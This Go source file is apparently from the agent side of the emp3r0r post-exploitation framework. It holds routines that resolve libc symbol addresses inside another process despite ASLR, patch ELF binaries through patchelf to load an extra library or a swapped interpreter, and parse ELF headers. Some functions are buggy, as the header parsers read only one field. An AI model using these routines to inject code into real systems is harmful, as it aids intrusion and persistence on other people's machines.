//go:build linux
// +build linux

package agent

import (
	"bufio"
	"bytes"
	"debug/elf"
	"encoding/binary"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"

	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// ELF constants
const (
	ELFCLASS32 = 1
	ELFCLASS64 = 2
)

// ELF64Header represents the ELF header for 64-bit binaries.
type ELF64Header struct {
	Ident     [16]byte
	Type      uint16
	Machine   uint16
	Version   uint32
	Entry     uint64
	Phoff     uint64
	Shoff     uint64
	Flags     uint32
	Ehsize    uint16
	Phentsize uint16
	Phnum     uint16
	Shentsize uint16
	Shnum     uint16
	Shstrndx  uint16
}

// ELF32Header represents the ELF header for 32-bit binaries.
type ELF32Header struct {
	Ident     [16]byte
	Type      uint16
	Machine   uint16
	Version   uint32
	Entry     uint32
	Phoff     uint32
	Shoff     uint32
	Flags     uint32
	Ehsize    uint16
	Phentsize uint16
	Phnum     uint16
	Shentsize uint16
	Shnum     uint16
	Shstrndx  uint16
}

// GetSymFromLibc gets the pointer to a libc function that is currently loaded in the target process, ASLR-proof.
// Parameters:
// - pid: Process ID of the target process.
// - sym: Name of the symbol to find.
func GetSymFromLibc(pid int, sym string) (addr int64, err error) {
	libc_path, base, offset, err := GetLibc(pid)
	if base == 0 || err != nil {
		err = fmt.Errorf("libc not found: %v", err)
		return
	}
	elf_file, err := elf.Open(libc_path)
	if err != nil {
		err = fmt.Errorf("ELF open: %v", err)
		return
	}
	defer elf_file.Close()
	syms, err := elf_file.DynamicSymbols()
	if err != nil {
		err = fmt.Errorf("ELF symbols: %v", err)
		return
	}
	for _, s := range syms {
		if strings.Contains(s.Name, sym) {
			addr = base + int64(s.Value) - offset
			break
		}
	}
	if addr == 0 {
		err = fmt.Errorf("scanned %d symbols, symbol (addr 0x%x) %s not found", len(syms), addr, sym)
		return
	}
	log.Printf("Address of %s is 0x%x", sym, addr)

	return
}

// GetLibc gets the base address, ASLR offset value, and path of libc by parsing /proc/pid/maps.
// Parameters:
// - pid: Process ID of the target process.
func GetLibc(pid int) (path string, addr, offset int64, err error) {
	map_path := fmt.Sprintf("/proc/%d/maps", pid)

	f, err := os.Open(map_path)
	if err != nil {
		err = fmt.Errorf("open %s: %v", map_path, err)
		return
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := scanner.Text()
		isLibc := strings.Contains(line, "libc.so") && strings.Contains(line, " r-xp ")
		if !isLibc {
			continue
		}
		fields := strings.Fields(line)
		addr, _ = strconv.ParseInt(strings.Split(line, "-")[0], 16, 64)
		offset, _ = strconv.ParseInt(fields[2], 16, 64)

		path = fields[len(fields)-1]
		log.Printf("libc base addr is 0x%x, offset is 0x%x, path is %s",
			addr, offset, path)
		break
	}

	// check if we got the right libc
	if path == "" {
		err = fmt.Errorf("scanned map file, libc not found")
	}

	return
}

// AddNeededLib adds a needed library to an ELF file. lib_file needs to be the full path.
// Parameters:
// - elf_file: Path to the ELF file to modify.
// - lib_file: Path to the library to add.
func AddNeededLib(elf_file, lib_file string) (err error) {
	// backup
	bak := fmt.Sprintf("%s/%s.bak", RuntimeConfig.AgentRoot, elf_file)
	if !util.IsFileExist(bak) {
		util.Copy(elf_file, bak)
	}

	// patchelf cmd
	cmd := fmt.Sprintf("%s/patchelf --add-needed %s %s",
		RuntimeConfig.UtilsPath, lib_file, elf_file)
	out, err := exec.Command("sh", "-c", cmd).CombinedOutput()
	if err != nil {
		err = fmt.Errorf("patchelf: %v, %s", err, out)
	}
	return
}

// IsELF checks if a file is an ELF file.
// Parameters:
// - file: Path to the file to check.
func IsELF(file string) bool {
	f, err := os.Open(file)
	if err != nil {
		return false
	}
	defer f.Close()
	_, err = elf.NewFile(f)
	if err != nil {
		return false
	}
	return true
}

// FixELF replaces ld and adds rpath to use musl libc.
// Parameters:
// - elf_path: Path to the ELF file to fix.
func FixELF(elf_path string) (err error) {
	pwd, _ := os.Getwd()
	err = os.Chdir(RuntimeConfig.UtilsPath)
	if err != nil {
		return
	}
	defer os.Chdir(pwd)

	// paths
	rpath := fmt.Sprintf("%s/lib/", RuntimeConfig.UtilsPath)
	patchelf := fmt.Sprintf("%s/patchelf", RuntimeConfig.UtilsPath)
	ld_path := fmt.Sprintf("%s/ld-musl-x86_64.so.1", rpath)
	log.Printf("rpath: %s, patchelf: %s, ld_path: %s", rpath, patchelf, ld_path)

	// remove rpath
	cmd := fmt.Sprintf("%s --remove-rpath", patchelf)
	out, err := exec.Command("/bin/sh", "-c", cmd).CombinedOutput()
	if err != nil {
		err = fmt.Errorf("patchelf remove rpath: %v, %s", err, out)
	}

	// patchelf cmd
	cmd = fmt.Sprintf("%s --set-interpreter %s --set-rpath %s %s",
		patchelf, ld_path, rpath, elf_path)

	out, err = exec.Command("/bin/sh", "-c", cmd).CombinedOutput()
	if err != nil {
		err = fmt.Errorf("patchelf: %v, %s", err, out)
	}
	return
}

// IsStaticELF checks if the given ELF file is statically linked.
// Parameters:
// - file_path: Path to the ELF file to check.
func IsStaticELF(file_path string) bool {
	f, err := elf.Open(file_path)
	if err != nil {
		log.Printf("Error opening ELF file: %v", err)
		return false
	}
	defer f.Close()

	// Check if the ELF file is statically linked
	isStaticallyLinked := true
	for _, phdr := range f.Progs {
		if phdr.Type == elf.PT_DYNAMIC {
			isStaticallyLinked = false
			break
		}
	}
	return isStaticallyLinked
}

// ParseELFHeaders parses ELF headers from the given byte slice.
// Parameters:
// - data: Byte slice containing the ELF file data.
func ParseELFHeaders(data []byte) (interface{}, error) {
	reader := bytes.NewReader(data)

	// Verify ELF magic number
	var ident [16]byte
	if _, err := reader.Read(ident[:]); err != nil {
		log.Printf("Failed to read ELF identification: %v", err)
		return nil, err
	}
	if !bytes.Equal(ident[:4], []byte{0x7f, 'E', 'L', 'F'}) {
		log.Printf("Not an ELF file (invalid magic number)")
		return nil, fmt.Errorf("invalid ELF magic number")
	}

	// Determine ELF class (32-bit or 64-bit)
	class := ident[4]
	if class == ELFCLASS64 {
		return ParseELF64(reader, ident)
	} else if class == ELFCLASS32 {
		return ParseELF32(reader, ident)
	}
	log.Printf("Unsupported ELF class: %v", class)
	return nil, fmt.Errorf("unsupported ELF class: %v", class)
}

// ParseELF64 parses the ELF header for 64-bit binaries.
// Parameters:
// - reader: Reader for the ELF file data.
// - ident: ELF identification bytes.
func ParseELF64(reader *bytes.Reader, ident [16]byte) (*ELF64Header, error) {
	var header ELF64Header
	header.Ident = ident
	if err := binary.Read(reader, binary.LittleEndian, &header.Type); err != nil {
		log.Printf("Failed to read ELF64 header: %v", err)
		return nil, err
	}

	log.Printf("ELF64 Header:")
	log.Printf("  Entry Point:       0x%x", header.Entry)
	log.Printf("  Program Header Off: %d", header.Phoff)
	log.Printf("  Section Header Off: %d", header.Shoff)
	log.Printf("  Number of PH:      %d", header.Phnum)
	log.Printf("  Number of SH:      %d", header.Shnum)
	log.Printf("  Size of PH Entry:  %d", header.Phentsize)

	// Read program headers
	if err := parseProgramHeaders(reader, int64(header.Phoff), int(header.Phnum), int(header.Phentsize), ELFCLASS64); err != nil {
		return nil, err
	}

	return &header, nil
}

// ParseELF32 parses the ELF header for 32-bit binaries.
// Parameters:
// - reader: Reader for the ELF file data.
// - ident: ELF identification bytes.
func ParseELF32(reader *bytes.Reader, ident [16]byte) (*ELF32Header, error) {
	var header ELF32Header
	header.Ident = ident
	if err := binary.Read(reader, binary.LittleEndian, &header.Type); err != nil {
		log.Printf("Failed to read ELF32 header: %v", err)
		return nil, err
	}

	log.Printf("ELF32 Header:")
	log.Printf("  Entry Point:       0x%x", header.Entry)
	log.Printf("  Program Header Off: %d", header.Phoff)
	log.Printf("  Section Header Off: %d", header.Shoff)
	log.Printf("  Number of PH:      %d", header.Phnum)
	log.Printf("  Number of SH:      %d", header.Shnum)
	log.Printf("  Size of PH Entry:  %d", header.Phentsize)

	// Read program headers
	if err := parseProgramHeaders(reader, int64(header.Phoff), int(header.Phnum), int(header.Phentsize), ELFCLASS32); err != nil {
		return nil, err
	}

	return &header, nil
}

// parseProgramHeaders parses the program headers from the given reader.
// Parameters:
// - reader: Reader for the ELF file data.
// - phOff: Offset to the program headers.
// - phNum: Number of program headers.
// - elfClass: ELF class (32-bit or 64-bit).
func parseProgramHeaders(reader *bytes.Reader, phOff int64, phNum, _ int, elfClass byte) error {
	if _, err := reader.Seek(phOff, 0); err != nil {
		log.Printf("Failed to seek to program headers: %v", err)
		return err
	}

	log.Printf("Program Headers:")
	for i := 0; i < phNum; i++ {
		if elfClass == ELFCLASS64 {
			type ProgHeader64 struct {
				Type   uint32
				Flags  uint32
				Off    uint64
				Vaddr  uint64
				Paddr  uint64
				Filesz uint64
				Memsz  uint64
				Align  uint64
			}

			var ph ProgHeader64
			if err := binary.Read(reader, binary.LittleEndian, &ph); err != nil {
				log.Printf("Failed to read program header: %v", err)
				return err
			}
			log.Printf("  [%d] Type: 0x%x, Offset: 0x%x, VAddr: 0x%x, PAddr: 0x%x", i, ph.Type, ph.Off, ph.Vaddr, ph.Paddr)
			log.Printf("      File Size: %d, Mem Size: %d, Flags: 0x%x, Align: %d", ph.Filesz, ph.Memsz, ph.Flags, ph.Align)
		} else {
			type ProgHeader32 struct {
				Type   uint32
				Off    uint32
				Vaddr  uint32
				Paddr  uint32
				Filesz uint32
				Memsz  uint32
				Flags  uint32
				Align  uint32
			}

			var ph ProgHeader32
			if err := binary.Read(reader, binary.LittleEndian, &ph); err != nil {
				log.Printf("Failed to read program header: %v", err)
				return err
			}
			log.Printf("  [%d] Type: 0x%x, Offset: 0x%x, VAddr: 0x%x, PAddr: 0x%x", i, ph.Type, ph.Off, ph.Vaddr, ph.Paddr)
			log.Printf("      File Size: %d, Mem Size: %d, Flags: 0x%x, Align: %d", ph.Filesz, ph.Memsz, ph.Flags, ph.Align)
		}
	}
	return nil
}
